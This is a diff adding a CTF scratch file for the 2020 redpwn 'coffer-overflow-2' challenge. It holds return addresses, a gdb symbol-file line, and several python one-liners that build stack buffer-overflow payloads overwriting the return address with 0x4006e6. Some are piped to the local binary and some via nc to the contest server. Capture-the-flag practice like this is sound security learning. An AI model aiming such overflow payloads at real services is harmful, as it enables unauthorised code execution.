@@ -1,0 +1,15 @@
+400803
+4006e6
+400570
+400700
+symbol-file /vagrant/2020-redpwn/pwn/coffer-overflow-2/coffer-overflow-2
+
+python -c 'print "a"*24 + "\xe6\x06\x40\x00\x00\x00\x00\x00"' | nc 2020.redpwnc.tf 31908
+python -c 'print "a"*23 + "\x00" + "\xe6\x06\x40\x00"' | ./coffer-overflow-2
+
+python -c 'print "a"*24+"\xe6\x06\x40\x00"+"\x00"*8' | ./coffer-overflow-2
+python -c 'print "a"*16+"\x01"*8+"\x00"*8+"\xe6\x06\x40\x00"' | nc 2020.redpwnc.tf 31908
+python -c "print b'aaaaaaaaaaaaaaaabbbbbbbb\xe6\x06@\x00\x00\x00\x00\x00'"
+
+
+
